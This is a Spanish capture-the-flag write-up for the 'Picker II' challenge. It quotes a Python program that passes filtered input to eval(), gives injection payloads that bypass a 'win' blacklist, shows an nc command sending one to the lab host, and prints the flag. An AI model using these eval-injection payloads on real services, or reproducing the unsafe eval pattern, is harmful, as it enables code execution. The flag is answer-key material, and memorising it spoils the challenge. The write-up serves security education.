## Descripción
Can you figure out how this program works to get the flag?

## Solución
- Analizamos el código fuente proporcionado en `picker-II.py`:
  ```python
  def win():
    flag = open('flag.txt', 'r').read()
    flag = flag.strip()
    str_flag = ''
    for c in flag:
      str_flag += str(hex(ord(c))) + ' '
    print(str_flag)

  def filter(user_input):
    if 'win' in user_input:
      return False
    return True

  while(True):
    try:
      user_input = input('==> ')
      if( filter(user_input) ):
        eval(user_input + '()')
      else:
        print('Illegal input')
    except Exception as e:
      print(e)
      break
  ```
- A diferencia del reto anterior (Picker I), se ha añadido una función `filter(user_input)` que comprueba si la subcadena `'win'` está presente en la entrada del usuario (`if 'win' in user_input: return False`).
- Sin embargo, el programa sigue pasando `user_input + '()'` directamente a la función `eval()`.
- Dado que `eval()` permite evaluar cualquier expresión válida de Python, podemos eludir la restricción de múltiples maneras:
  1. **Inyección directa de lectura de archivo:** Comentando los paréntesis que añade el programa al final mediante `#`:
     ```python
     print(open('flag.txt').read())#
     ```
     Al ejecutarse: `eval("print(open('flag.txt').read())#()")`, Python evalúa la llamada a `print(...)` e ignora el resto `#()`.
  2. **Invocación indirecta de `win()` sin usar la palabra 'win' explícita:**
     ```python
     globals()['w'+'in']()#
     ```
- Nos conectamos a la instancia xebec.cylabacademy.net:17838` y enviamos el payload:
  ```bash
  echo "print(open('flag.txt').read())#" | nc xebec.cylabacademy.net 17838
  ```
- El servidor ejecuta la expresión y responde directamente con la bandera:
```text
academy{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_c9aa7a3c}
```

## Notas Adicionales
- Las listas negras (*blacklists*) en el procesamiento de entradas suelen ser ineficaces frente a ataques de inyección, ya que existen múltiples vías alternativas en el lenguaje de ejecución para lograr el mismo objetivo o evadir filtros simples de cadenas.
- El uso de comentarios de línea de Python (`#`) dentro de cadenas concatenadas en `eval()` permite anular los sufijos agregados por la aplicación.
- Herramientas utilizadas:
  - `nc` (Netcat) / script en Python con `socket`.

## Referencias
- [CWE-95: Eval Injection](https://cwe.mitre.org/data/definitions/95.html)
- [CWE-184: Incomplete List of Disallowed Inputs (Blacklist Ineffectiveness)](https://cwe.mitre.org/data/definitions/184.html)
